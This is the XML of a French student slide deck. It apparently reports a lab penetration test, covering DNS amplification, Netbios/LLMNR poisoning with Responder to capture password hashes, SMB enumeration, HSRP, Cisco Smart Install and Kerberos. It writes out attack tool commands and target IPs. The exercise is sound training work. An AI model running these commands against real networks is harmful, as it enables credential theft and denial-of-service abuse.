                </a:solidFill>
              </a:rPr>
              <a:t>Étape 2 : Récolte d'informations :</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>dig</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> ANY @192.168.70.26 Pellet-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SA.local</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR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sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none" spc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Résultat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none" spc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 :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="20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;; flags: qr rd ra ad;</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="fr-FR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>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Étape 3 : Démonstration de la vulnérabilité. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>dig</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> ANY google.com @192.168.70.26 +</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>dnssec</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR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>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Résultat </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="18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; MSG SIZE rcvd: 1038</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Aptos"/>
              <a:ea typeface="Aptos"/>
              <a:cs typeface="Aptos"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="18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facteur</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Aptos"/>
                <a:cs typeface="Aptos"/>
              </a:rPr>
              <a:t> : 1038/60 = 17 </a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="bg1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>
            <a:lumMod val="95000"/>
            <a:lumOff val="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23272717" name="Groupe 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4786639" y="-1210295"/>
            <a:ext cx="8704970" cy="9583185"/>
            <a:chOff x="4786639" y="-1210295"/>
            <a:chExt cx="8704970" cy="9583185"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="Graphique 4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>
              <a:off x="4921107" y="-451085"/>
              <a:ext cx="8436036" cy="8436036"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="6" name="Graphique 5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 rot="2594715">
              <a:off x="4786639" y="-1210295"/>
              <a:ext cx="8704970" cy="9583185"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1863111184" name="Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="-1330330" y="577849"/>
            <a:ext cx="5771361" cy="68814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41183585" name="Titre 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="228996" y="233952"/>
            <a:ext cx="7862492" cy="54051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fr-FR" sz="2600">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Bold"/>
              </a:rPr>
              <a:t>Cisco Smart Install</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2138466623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3366459" y="1623679"/>
            <a:ext cx="5648509" cy="44014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>
            <a:lumMod val="95000"/>
            <a:lumOff val="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25084960" name="Groupe 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4786639" y="-1210295"/>
            <a:ext cx="8704970" cy="9583185"/>
            <a:chOff x="4786639" y="-1210295"/>
            <a:chExt cx="8704970" cy="9583185"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="Graphique 4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>
              <a:off x="4921107" y="-451085"/>
              <a:ext cx="8436036" cy="8436036"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="6" name="Graphique 5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 rot="2594715">
              <a:off x="4786639" y="-1210295"/>
              <a:ext cx="8704970" cy="9583185"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1613263723" name="Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="-1330329" y="577849"/>
            <a:ext cx="2659068" cy="68814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839680083" name="Titre 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="228996" y="233952"/>
            <a:ext cx="6402842" cy="54051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fr-FR" sz="2600">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Bold"/>
              </a:rPr>
              <a:t>DNS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>
            <a:lumMod val="95000"/>
            <a:lumOff val="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97687259" name="Groupe 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4786639" y="-1210295"/>
            <a:ext cx="8704970" cy="9583185"/>
            <a:chOff x="4786639" y="-1210295"/>
            <a:chExt cx="8704970" cy="9583185"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="Graphique 4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>
              <a:off x="4921107" y="-451085"/>
              <a:ext cx="8436036" cy="8436036"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="6" name="Graphique 5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 rot="2594715">
              <a:off x="4786639" y="-1210295"/>
              <a:ext cx="8704970" cy="9583185"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="944916215" name="Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="-1330330" y="577849"/>
            <a:ext cx="3363917" cy="68814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492428763" name="Titre 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="228996" y="233952"/>
            <a:ext cx="6402842" cy="54051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fr-FR" sz="2600">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Bold"/>
              </a:rPr>
              <a:t>Netbios</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="2600">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="JetBrains Mono Bold"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="987501941" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="2330782" y="1417117"/>
            <a:ext cx="6467905" cy="1493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fr-FR" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc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Etape 1 : </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0" i="0" u="none">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>s</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2000" b="0" i="0" u="none">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>udo responder -I eth0 -A</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="200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defRPr/>
            </a:pPr>
            <a:endParaRPr sz="180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sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc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Étape 2 : avoir eu un poste connecté à l’AD</a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none" spc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Étape 3 : Obtention utilisateur et hash du mot de passe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>
            <a:lumMod val="95000"/>
            <a:lumOff val="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41342168" name="Groupe 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4786639" y="-1210295"/>
            <a:ext cx="8704970" cy="9583185"/>
            <a:chOff x="4786639" y="-1210295"/>
            <a:chExt cx="8704970" cy="9583185"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="Graphique 4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>
              <a:off x="4921107" y="-451085"/>
              <a:ext cx="8436036" cy="8436036"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="6" name="Graphique 5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 rot="2594715">
              <a:off x="4786639" y="-1210295"/>
              <a:ext cx="8704970" cy="9583185"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1737300575" name="Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="-1330330" y="577849"/>
            <a:ext cx="2673355" cy="68814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639074771" name="Titre 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="228996" y="233952"/>
            <a:ext cx="6402842" cy="54051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fr-FR" sz="2600">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Bold"/>
              </a:rPr>
              <a:t>SMB</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1445891541" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="3215161" y="2697480"/>
            <a:ext cx="5818915" cy="1737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fr-FR" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Etape 1 : </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" u="none">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>enum4linux -a 192.168.70.25</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Étape 2 : obtention nom de domaine, nom de machine et SID Domaine</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Aptos"/>
              <a:ea typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1800"/>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Aptos"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Étape 3 non réalisée : Session administrateur </a:t>
            </a:r>
            <a:endParaRPr sz="1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>
            <a:lumMod val="95000"/>
            <a:lumOff val="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610949732" name="Groupe 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4786639" y="-1210295"/>
            <a:ext cx="8704970" cy="9583185"/>
            <a:chOff x="4786639" y="-1210295"/>
            <a:chExt cx="8704970" cy="9583185"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="Graphique 4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>
              <a:off x="4921107" y="-451085"/>
              <a:ext cx="8436036" cy="8436036"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="6" name="Graphique 5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 rot="2594715">
              <a:off x="4786639" y="-1210295"/>
              <a:ext cx="8704970" cy="9583185"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1430694175" name="Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="-1330329" y="577849"/>
            <a:ext cx="2923386" cy="68814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246454276" name="Titre 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="228996" y="233952"/>
            <a:ext cx="6402842" cy="5405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fr-FR" sz="2700">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Bold"/>
              </a:rPr>
              <a:t>HSRP</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="298349504" name="Titre 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="228996" y="1459503"/>
            <a:ext cx="6402842" cy="5405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fr-FR" sz="2400">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>Exploitation 5 : [HSRP]</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="936227746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3300523" y="442199"/>
            <a:ext cx="4983804" cy="61256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>
            <a:lumMod val="95000"/>
            <a:lumOff val="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2093777" name="Groupe 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4786639" y="-1210295"/>
            <a:ext cx="8704970" cy="9583185"/>
            <a:chOff x="4786639" y="-1210295"/>
            <a:chExt cx="8704970" cy="9583185"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="Graphique 4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>
              <a:off x="4921107" y="-451085"/>
              <a:ext cx="8436036" cy="8436036"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="6" name="Graphique 5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 rot="2594715">
              <a:off x="4786639" y="-1210295"/>
              <a:ext cx="8704970" cy="9583185"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="342503837" name="Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="-1330331" y="577849"/>
            <a:ext cx="3668719" cy="68814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230393848" name="Titre 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="228996" y="233952"/>
            <a:ext cx="6402842" cy="54051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fr-FR" sz="2700">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Bold"/>
              </a:rPr>
              <a:t>Kerberos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>
            <a:lumMod val="95000"/>
            <a:lumOff val="5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3502513" name="Rectangle 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="-333828" y="5495926"/>
            <a:ext cx="5001078" cy="409574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1138420999" name="Groupe 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4786639" y="-1210295"/>
            <a:ext cx="8704970" cy="9583185"/>
            <a:chOff x="4786639" y="-1210295"/>
            <a:chExt cx="8704970" cy="9583185"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="Graphique 4"/>
            <p:cNvPicPr>
              <a:picLocks noChangeAspect="1"/>
            </p:cNvPicPr>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId3"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4921107" y="-451085"/>
              <a:ext cx="8436036" cy="8436036"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="6" name="Graphique 5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 rot="2594715">
              <a:off x="4786639" y="-1210295"/>
              <a:ext cx="8704970" cy="9583185"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1908935666" name="Titre 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="628195" y="2994806"/>
            <a:ext cx="8147505" cy="2387600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="5400">
                <a:solidFill>
                  <a:srgbClr val="0077FF"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Bold"/>
                <a:cs typeface="JetBrains Mono Bold"/>
              </a:rPr>
              <a:t>FIN DE LA PRÉSENTATION_</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1646231330" name="Titre 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="653594" y="5495926"/>
            <a:ext cx="8147505" cy="45797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fr-FR" sz="2400">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono Light"/>
                <a:cs typeface="JetBrains Mono Light"/>
              </a:rPr>
              <a:t>MERCI DE VOTRE ÉCOUTE</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="829372189" name="Graphique 11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22185" y="605060"/>
            <a:ext cx="1596546" cy="649218"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="523515331" name="Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="2700000">
            <a:off x="8630545" y="-609808"/>
            <a:ext cx="7015164" cy="2180749"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="005A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300699042" name="Rectangle 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="2700000">
            <a:off x="8679043" y="-589720"/>
            <a:ext cx="7015164" cy="2043580"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0077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onlyoffice/9.2.1.8</Application>
  <PresentationFormat>On-screen Show (4:3)</PresentationFormat>
  <Paragraphs>0</Paragraphs>
  <Slides>14</Slides>
  <Notes>14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Sacha</dc:creator>
  <cp:lastModifiedBy>Come Dairin (come.dairin@etu.unicaen.fr)</cp:lastModifiedBy>
  <cp:revision>55</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-01-15T14:57:59Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-01-16T13:43:20Z</dcterms:modified>
</cp:coreProperties>
</file>